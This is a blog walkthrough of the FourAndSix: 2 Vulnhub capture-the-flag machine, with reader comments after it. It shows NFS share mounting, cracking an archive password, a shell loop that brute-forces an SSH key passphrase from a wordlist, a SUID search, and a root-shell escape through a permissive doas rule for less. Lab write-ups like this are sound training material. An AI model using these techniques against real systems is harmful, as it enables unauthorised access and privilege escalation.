@@ -1,0 +1,344 @@
+
+								
+																		FourAndSix: 2 Vulnhub Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on November 23, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									FourAndSix: 2 is the sequel for previously solved vulnerable machine FourAndSix by Fred uploaded on vulnhub. It is not mandatory but is advised to read the prequel of this lab here. You can download the FourAndSix:2 vulnerable lab from here. The challenge is to become root and read flag.txt in the same directory.
+Table of Contents:
+
+Discovery of IP address.
+Scanning for open ports and services.
+Discovering universally accessible directory in the victim’s machine.
+Cracking the password of archive found in the storage partition.
+Reading the pub file and logging in using ssh.
+Discovering utilities with sticky bit on them.
+Using doas to get root.
+Snagging the flag!
+Let’s get started then.
+
+The first step is, as usual, to find the IP of the target machine using netdiscover. In this case, it is 192.168.1.103
+
+Next, we discover open ports and services using nmap.
+
+
+		
+		
+			
+			
+			
+			
+nmap -A 192.168.1.103
+			
+				
+					
+				
+					1
+				
+						nmap -A 192.168.1.103
+					
+				
+			
+		
+
+The ports open were 22, 111, 2049.
+
+There was only one way to proceed and that is port 2049. So, we used showmount command to check for NFS shared partitions.
+Later, we mounted it under the folder name “raj” using the mount command. And we found a 7z compressed file.
+
+		
+		
+			
+			
+			
+			
+showmount -e 192.168.1.103
+mount -t nfs 192.168.1.103:/home/user/storage raj
+			
+				
+					
+				
+					12
+				
+						showmount -e 192.168.1.103mount -t nfs 192.168.1.103:/home/user/storage raj
+					
+				
+			
+		
+
+
+But the file “backup.7z” was, unfortunately, password protected.
+
+So, after trying out a number of options like John The Ripper and getting zero success, we found a site online to break its password.
+The password was: chocolate
+
+We extracted its contents in the same folder and found a few images along with RSA keys. As port 22 is running SSH service on the target machine, we can use RSA private key to login. We open RSA public key to taking a look at the username.
+
+		
+		
+			
+			
+			
+			
+cat id_rsa.pub
+			
+				
+					
+				
+					1
+				
+						cat id_rsa.pub
+					
+				
+			
+		
+
+
+We tried logging in to ssh but it was asking for a passphrase. So, we created the following script to find the correct password.
+
+		
+		
+			
+			
+			
+			
+cat /usr/share/wordlists/metasploit/adobe_top100_pass.txt | while read pass; do if ssh-keygen –c –C "user@forandsix" –P $pass –f id_rsa &amp;&gt;/dev/null; then echo $pass; break; fi; done
+			
+				
+					
+				
+					1
+				
+						cat /usr/share/wordlists/metasploit/adobe_top100_pass.txt | while read pass; do if ssh-keygen –c –C "[email protected]" –P $pass –f id_rsa &amp;&gt;/dev/null; then echo $pass; break; fi; done
+					
+				
+			
+		
+
+
+From the id_rsa.pub file, we found the user for the secure shell of the victim and logged in to it. The password was: “12345678”.
+
+		
+		
+			
+			
+			
+			
+ssh -i id_rsa user@192.168.1.103
+			
+				
+					
+				
+					1
+				
+						ssh -i id_rsa user@192.168.1.103
+					
+				
+			
+		
+
+We used the find utility to discover files or packages with SUID bit set on them.
+
+		
+		
+			
+			
+			
+			
+find / -perm –u=s –type f 2&gt;/dev/null
+			
+				
+					
+				
+					1
+				
+						find / -perm –u=s –type f 2&gt;/dev/null
+					
+				
+			
+		
+
+We found an interesting utility with SUID bit: /usr/bin/doas which is an alternate to sudo.
+After reading the “doas.conf” file, we find that “less” can be run as root.
+
+Let’s pick the configuration file and try to understand it word by word. Doas utility executes commands as other users according to the rules in doas.conf configuration file.
+Permit/Deny: allows the rule.
+Nopass: the user is not required to enter any password.
+Persist: After the user successfully authenticates, do not ask for a password again for some time.
+Keepenv: The user’s environment is maintained.
+Cmd: command is allowed to run.
+Since doas configuration file says that less can be run with no password at all as root with no password, it can be used for shell escaping.
+
+		
+		
+			
+			
+			
+			
+doas /usr/bin/less /var/log/authlog
+			
+				
+					
+				
+					1
+				
+						doas /usr/bin/less /var/log/authlog
+					
+				
+			
+		
+
+ 
+Enter v to escape to vi and then “:!sh” to escape to our brand new shell.
+
+The final step was to snag the flag! It was in the root directory as told by the creator of the VM.
+id shows that the shell is root shell and finally we read the congratulatory flag using cat!
+
+So this was how we root the FourAndSix:2. Hope you liked it.
+Author: Harshit Rajpal is an InfoSec researcher and a left and right brain thinker. contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
+							
+								Arovil Pradhan November 24, 2018 at 5:07 pm							
+							
+							
+														
+							
+								Sir I am learning a lot from you, I want to learn ethical hacking, penetration testing, cyber forensics and many more in cyber security field. currently I am trying for accomplishing LAB exam of NSD by ISAC in web app pentesting. I am also solving CTF’s from vulnhub for learning .I need your valuable guidance for enlightening my path in this field.
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
+							
+								Raj Chandel November 24, 2018 at 5:30 pm							
+							
+							
+														
+							
+								contact [email protected]
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
+							
+								Eshan January 4, 2019 at 3:44 pm							
+							
+							
+														
+							
+								It should be “:!sh” not “!sh”.
+Great Walkthrough..!
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
+							
+								Raj Chandel January 5, 2019 at 5:28 pm							
+							
+							
+														
+							
+								updated thanks
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
